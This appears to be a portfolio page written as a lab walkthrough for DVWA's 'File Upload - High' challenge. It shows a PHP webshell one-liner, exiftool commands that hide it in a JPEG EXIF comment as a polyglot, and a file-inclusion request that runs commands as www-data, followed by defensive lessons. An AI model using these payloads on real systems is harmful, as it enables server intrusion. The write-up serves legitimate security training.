@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>File Upload - High — MOSTAFA ELWASEEF's Portfolio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+      --border: #30363d; --text: #e6edf3; --muted: #8b949e;
+      --accent: #58a6ff; --accent2: #3fb950; --red: #f85149;
+      --orange: #d29922; --radius: 8px;
+      --c-red: #f85149; --c-blue: #58a6ff; --c-green: #3fb950;
+      --c-yellow: #d29922; --c-purple: #bc8cff; --c-pink: #ff7b72;
+      --c-gray: #8b949e;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; font-size: 15px; line-height: 1.7; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { position: sticky; top: 0; z-index: 100; background: rgba(13,17,23,.9); backdrop-filter: blur(12px);
+          border-bottom: 1px solid var(--border); padding: .75rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo { font-weight: 600; font-size: 1rem; color: var(--text); }
+    .nav-back { font-size: .85rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+    .nav-back:hover { color: var(--accent); text-decoration: none; }
+    .hero { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; }
+    .hero-inner { max-width: 860px; margin: 0 auto; }
+    .breadcrumb { font-size: .8rem; color: var(--muted); margin-bottom: 1rem; }
+    .breadcrumb a { color: var(--muted); }
+    .breadcrumb a:hover { color: var(--accent); }
+    .hero h1 { font-size: 2rem; font-weight: 700; margin-bottom: 1rem; }
+    .hero p.desc { color: var(--muted); max-width: 640px; margin-top: .5rem; }
+    .meta-row { display: flex; flex-wrap: wrap; gap: .6rem; align-items: center; }
+    .badge { display: inline-flex; align-items: center; gap: .3rem; padding: .25rem .7rem;
+             border-radius: 20px; font-size: .75rem; font-weight: 500; white-space: nowrap; flex-shrink: 0; }
+    .badge-platform { background: #1f3a5f; color: #58a6ff; border: 1px solid #1f4080; }
+    .badge-easy { background: #1a3a2a; color: #3fb950; border: 1px solid #2ea043; }
+    .badge-medium { background: #3a2a1a; color: #d29922; border: 1px solid #9e6a03; }
+    .badge-hard { background: #3a1a1a; color: #f85149; border: 1px solid #da3633; }
+    .badge-beginner { background: #1a3a2a; color: #56d364; border: 1px solid #2ea043; }
+    .badge-critical { background: #2f1f47; color: #bc8cff; border: 1px solid #6e40c9; }
+    .badge-impossible { background: #2f1f47; color: #bc8cff; border: 1px solid #6e40c9; }
+    .badge-os { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .badge-date { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .content { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    h1, h2, h3 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
+    h2 { font-size: 1.35rem; padding-bottom: .5rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1.1rem; color: var(--accent); }
+    p { margin: .6rem 0; color: #c9d1d9; }
+    ul, ol { margin: .5rem 0 .5rem 1.5rem; }
+    li { margin: .3rem 0; color: #c9d1d9; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+    blockquote { border-left: 3px solid var(--accent); padding: .5rem 1rem; margin: .75rem 0;
+                 background: var(--bg2); border-radius: 0 var(--radius) var(--radius) 0; color: var(--muted); }
+    pre { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
+          padding: 1rem 1.25rem; overflow-x: auto; margin: .75rem 0; }
+    code { font-family: 'Fira Code', monospace; font-size: .85rem; color: #e6edf3; }
+    p code, li code, td code, h1 code, h2 code, h3 code, blockquote code {
+      background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; color: var(--accent); font-size: .82rem;
+    }
+    strong code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; }
+    figure { margin: 1.25rem 0; }
+    img { max-width: 100%; border-radius: var(--radius); border: 1px solid var(--border);
+          display: block; margin: 0 auto; }
+    figcaption { text-align: center; font-size: .8rem; color: var(--muted); margin-top: .4rem; }
+    .callout { display: flex; gap: .75rem; align-items: flex-start; background: var(--bg2);
+               border: 1px solid var(--border); border-radius: var(--radius); padding: .9rem 1rem; margin: .75rem 0; }
+    .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: .1rem; }
+    details { border: 1px solid var(--border); border-radius: var(--radius); margin: .5rem 0; }
+    summary { padding: .6rem 1rem; cursor: pointer; font-weight: 500; background: var(--bg2); border-radius: var(--radius); }
+    details[open] summary { border-radius: var(--radius) var(--radius) 0 0; border-bottom: 1px solid var(--border); }
+    details > *:not(summary) { padding: .75rem 1rem; }
+    .table-wrap { overflow-x: auto; margin: .75rem 0; }
+    table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+    th, td { padding: .6rem .9rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg3); font-weight: 600; }
+    tr:nth-child(even) { background: rgba(33,38,45,.5); }
+    .columns { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1rem; margin: .75rem 0; }
+    .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
+    .card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem;
+            transition: border-color .15s, transform .15s; display: block; }
+    .card:hover { border-color: var(--accent); transform: translateY(-2px); text-decoration: none; }
+    .card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: .6rem; gap: .5rem; }
+    .card-title { font-size: 14px; font-weight: 600; color: var(--text); flex: 1 1 auto; min-width: 0; }
+    .card-meta { font-size: 12px; color: var(--muted); margin-bottom: .4rem; }
+    .card-desc { font-size: 13px; color: var(--muted); }
+    footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; color: var(--muted); font-size: .85rem; }
+    @media (max-width: 620px) {
+      nav { padding: .65rem 1.25rem; }
+      .hero { padding: 2rem 1.25rem 1.75rem; }
+      .hero h1 { font-size: 1.5rem; }
+      .content { padding: 2rem 1.25rem 3rem; }
+      .cards { grid-template-columns: 1fr; }
+    }
+</style>
+</head>
+<body>
+<nav>
+  <span class="nav-logo">Waseef</span>
+  <a href="../../../index.html" class="nav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-inner">
+    <div class="breadcrumb"><a href="../../../index.html">Portfolio</a> / <a href="../../../index.html#dvwa">DVWA</a> / <a href="index.html">File Upload</a> / File Upload - High</div>
+    <h1>File Upload - High</h1>
+    <div class="meta-row">
+      <span class="badge badge-platform">🖥 DVWA</span>
+      <span class="badge badge-hard">🔴 High</span>
+      <span class="badge badge-date">📅 2026-08-06</span>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+<h1 id="file-upload-high">File Upload — High</h1>
+<h2 id="lab-info">Lab Info</h2>
+<div class='table-wrap'><table>
+  <tr><th>Field</th><th>Value</th></tr>
+  <tr><td><strong>Lab</strong></td><td>File Upload</td></tr>
+  <tr><td><strong>Platform</strong></td><td>DVWA</td></tr>
+  <tr><td><strong>Security Level</strong></td><td>High</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-08-06</td></tr>
+</table></div>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="objective">Objective</h3>
+<p>Observe how the High security level behaves compared to Medium — determine whether the server now inspects the actual file content rather than trusting client-supplied metadata.</p>
+<h3 id="findings">Findings</h3>
+<p>The File Upload page presents the same form as the lower levels. To confirm the upload directory and baseline behavior, a benign <code>image.png</code> was uploaded. The server accepted it and returned the success message <code>../../hackable/uploads/image.png succesfully uploaded!</code> — confirming that a genuine image still passes and the upload path remains disclosed.</p>
+<p><strong>PoC:</strong><br>- <strong>Tools used</strong>: Browser<br>- <strong>Command</strong>: Upload <code>image.png</code> via the form<br>- <strong>Key finding</strong>: Benign upload succeeds and discloses the upload path</p>
+<blockquote>  <figure><img src="images/file-upload-high/3b4b7523717280e7b7d7f474073dd862.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b75237172804a961cdea4a0228fbd.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b7523717280798d7df0ed15eca233.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="exploitation-extension-and-content-type-bypass-attempts-failed">Exploitation — Extension and Content-Type Bypass Attempts (Failed)</h2>
+<h3 id="description">Description</h3>
+<p>Before assuming the High level was vulnerable to the same Content-Type header spoofing that worked at Medium, each of the simpler bypasses was tested and ruled out. The results showed the server was no longer trusting either the filename extension or the client-supplied Content-Type header alone — indicating it was now validating the file’s actual content.</p>
+<h3 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h3>
+<ol>
+  <li>A PHP webshell was prepared: <code>cp RCE_2.php RCE_3.php</code>, containing <code>&lt;?php system($_GET['cmd']); ?&gt;</code> (confirmed with <code>cat RCE_3.php</code>).</li>
+  <li><code>RCE_3.php</code> was selected via the Browse button and uploaded directly, with no modification. The server rejected it: <code>Your image was not uploaded. We can only accept JPEG or PNG images.</code></li>
+  <li>With Burp Suite intercepting the request, attempt 1 renamed only the filename to <code>RCE_3.png</code> while leaving <code>Content-Type: application/x-php</code> unchanged. The server rejected this as well, with the same JPEG/PNG error — confirming the extension alone is not sufficient to bypass the check.</li>
+  <li>Attempt 2 reverted the filename to keep the real <code>.php</code> extension (<code>RCE_3.php</code>) and changed the <code>Content-Type</code> header to <code>image/png</code> — the exact technique that succeeded at the Medium level. This was resent twice for confirmation. Both times the server rejected the upload with the same JPEG/PNG error, confirming the Content-Type header is no longer trusted on its own.</li>
+</ol>
+<p>These results indicate the High level is inspecting the file’s actual content (consistent with PHP’s <code>getimagesize()</code>, which reads an image’s real header/magic bytes rather than relying on the extension or submitted MIME type) in addition to the extension.</p>
+<blockquote>  <figure><img src="images/file-upload-high/3b4b75237172808c8300cac54da0f413.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b7523717280648cc5cf320f8ee519.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b7523717280f99515ccff1b2d0da8.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b752371728015aaebdc228c0927bc.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b75237172805ab92ae00598239615.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b7523717280838bf1cf8b887f5f5a.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b7523717280bdb0d9cfe8dddba05a.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b7523717280ba86cdffa1590097c9.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b752371728077bc7fce3c9875329b.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="exploitation-polyglot-file-bypass-success">Exploitation — Polyglot File Bypass (Success)</h2>
+<h3 id="description">Description</h3>
+<p>Since the server validates real image content, the payload needs to be a file that is simultaneously a valid, renderable image and executable PHP. This was achieved by embedding the PHP payload inside the EXIF <code>Comment</code> field of a genuine JPEG using <code>exiftool</code>. The resulting file’s JFIF header and image structure satisfy <code>getimagesize()</code>, while the embedded <code>&lt;?php system($_GET['cmd']); ?&gt;</code> payload remains present in the raw file bytes, ready to execute if the file is later parsed as PHP (e.g. via a File Inclusion vulnerability).</p>
+<h3 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h3>
+<ol>
+  <li>The first attempt to inject the payload directly failed: <code>exiftool -Comment="&lt;?php system($_GET['cmd']); ?&gt;" image.png -o polyglot.php</code> returned <code>Error: Not a valid PNG (looks more like a JPEG) - image.png</code>. Despite its <code>.png</code> extension, <code>image.png</code> is actually JPEG data, and <code>exiftool</code> validates the source file against the format implied by its extension before writing.</li>
+  <li>A second attempt targeting a <code>.png</code> output, <code>exiftool -Comment="&lt;?php system($_GET['cmd']); ?&gt;" image.png -o polyglot.png</code>, failed with the identical error for the same reason.</li>
+  <li>The fix was to give the source file a matching <code>.jpg</code> extension before invoking <code>exiftool</code>: <code>cp image.png image.jpg &amp;&amp; exiftool -Comment="&lt;?php system($_GET['cmd']); ?&gt;" image.jpg -o polyglot.jpg</code>. This succeeded: <code>1 image files created</code>.</li>
+  <li><code>polyglot.jpg</code> was selected and uploaded. The first upload attempt was rejected by the server with the same JPEG/PNG error.</li>
+  <li>The upload was retried, and this time succeeded: <code>../../hackable/uploads/polyglot.jpg succesfully uploaded!</code></li>
+  <li>Navigating directly to <code>http://127.0.0.1/dvwa/hackable/uploads/polyglot.jpg</code> rendered the file as a normal image in the browser, confirming it passes as a fully valid JPEG despite the embedded PHP payload.</li>
+</ol>
+<blockquote>  <figure><img src="images/file-upload-high/3b4b7523717280c7a356fcf529f38d38.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b752371728081aeb9c13ecd4b06b8.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b752371728099af77ce8b68c62bdf.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b7523717280d680b1dea61269e412.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b752371728078ba2dda24fcda80e0.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="exploitation-remote-code-execution-via-file-inclusion">Exploitation — Remote Code Execution via File Inclusion</h2>
+<h3 id="description">Description</h3>
+<p>A polyglot file that merely passes the image content check has no impact on its own — the uploaded <code>.jpg</code> is not directly executed by the PHP interpreter when requested normally. To trigger the embedded payload, the file was included through DVWA’s File Inclusion vulnerability, which passes user input straight into PHP’s <code>include()</code>. Including the polyglot causes PHP to parse and execute the <code>&lt;?php system($_GET['cmd']); ?&gt;</code> payload hidden in its EXIF Comment field, chaining the two vulnerabilities into full remote code execution.</p>
+<h3 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h3>
+<ol>
+  <li>The first inclusion attempt used a relative path with the <code>file://</code> wrapper: <code>fi/?page=file://../../hackable/uploads/polyglot.jpg&amp;cmd=id</code>. This failed with <code>Warning: include(): Remote host file access not supported</code> and <code>Failed to open stream: no suitable wrapper could be found</code>. Critically, the verbose PHP warning also disclosed the application’s full server-side path, <code>/var/www/html/dvwa/vulnerabilities/fi/index.php</code>, revealing the absolute path structure needed for the next attempt.</li>
+  <li>Using the disclosed path, the request was corrected to reference the polyglot with its full absolute path: <code>fi/?page=file:///var/www/html/dvwa/hackable/uploads/polyglot.jpg&amp;cmd=id</code>.</li>
+  <li>This succeeded — the response contained the polyglot’s raw JFIF/image bytes followed by the executed command output: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>, confirming remote code execution as the web server user.</li>
+</ol>
+<blockquote>  <figure><img src="images/file-upload-high/3b4b7523717280189a2febb28458e0d6.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/file-upload-high/3b4b75237172807e8432fe361664830d.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<p>The High level closes the gap left by Medium by validating the file’s actual content rather than trusting the extension or the client-supplied Content-Type header — consistent with a <code>getimagesize()</code>-style check. This defeated every simple bypass: uploading the webshell directly, renaming it while leaving the executable extension, and spoofing only the Content-Type header. All three were rejected identically, an important signal that the check now looks past filenames and headers entirely.</p>
+<p>However, validating that a file <em>looks like</em> a real image is not the same as ensuring it contains <em>only</em> image data. A polyglot file — one crafted to satisfy two different format parsers at once — passed the check easily: embedding the payload in the JPEG’s EXIF Comment field preserved a fully valid JFIF structure while smuggling executable PHP inside the file bytes. On its own, this still isn’t remote code execution, since the web server does not execute <code>.jpg</code> files as PHP. The impact only became critical once chained with a second vulnerability (File Inclusion) that could force the PHP interpreter to parse the uploaded file’s raw contents.</p>
+<p>This chain illustrates why upload validation should never be evaluated in isolation: a File Upload flaw that “only” allows a well-formed image with hidden extra content can still lead to full compromise if any other part of the application can be coerced into including or parsing that file as code. Defenses should include stripping or rejecting unexpected metadata (such as EXIF comments) from uploaded images, storing uploads outside the web root, and — most importantly — never passing user-controlled input into <code>include()</code>/<code>require()</code> without strict allowlisting.</p>
+
+</div>
+
+<footer>Built by Waseef · <a href="../../../index.html">Back to Portfolio</a></footer>
+</body>
+</html>
